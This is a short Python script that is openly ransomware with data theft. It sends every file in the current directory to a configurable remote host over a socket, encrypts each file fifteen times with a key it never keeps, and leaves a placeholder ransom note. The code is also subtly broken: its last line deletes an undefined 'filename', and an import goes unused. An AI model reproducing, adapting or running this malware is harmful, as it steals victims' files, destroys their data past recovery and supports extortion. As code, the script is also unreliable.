#!/bin/python3.9
import os
import socket
import time
from zipfile import ZipFile
from cryptography.fernet import Fernet

RHOST = "127.0.0.1" #Change this
RPORT = 9000 #Change this

# Get a list of the files
files = []
for file in os.listdir():
    if file == "croc.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

# Send the files to a remote server
s = socket.socket()
s.connect((RHOST, RPORT))
for file in files:
    with open(file, "rb") as thefile:
        thefile = thefile.read()
        s.send(thefile)

# Generate the key
key = Fernet.generate_key()

# Encrypt the files beyond repair
for i in range(15):
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

# Leave a note behind
text = "[Write whatever you want]"
with open("Note.txt", "w") as note:
    note.write(text)

# Remove the zip file
os.remove(filename)
